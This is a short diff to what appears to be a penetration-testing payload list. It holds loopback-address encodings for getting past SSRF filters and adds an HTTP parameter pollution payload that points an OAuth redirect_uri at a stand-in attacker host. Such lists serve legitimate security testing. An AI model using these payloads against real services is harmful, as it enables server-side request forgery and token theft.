@@ -125,6 +125,9 @@ http://①②⑦.⓪.⓪.⓪
 0x7F.1
 0x7F000001
 
+# HTTP Parameter Pollution
+redirect_uri=TARGET&redirect_uri=attacker.com
+
 # CDIR bypass
 http://127.127.127.127
 http://127.0.1.3
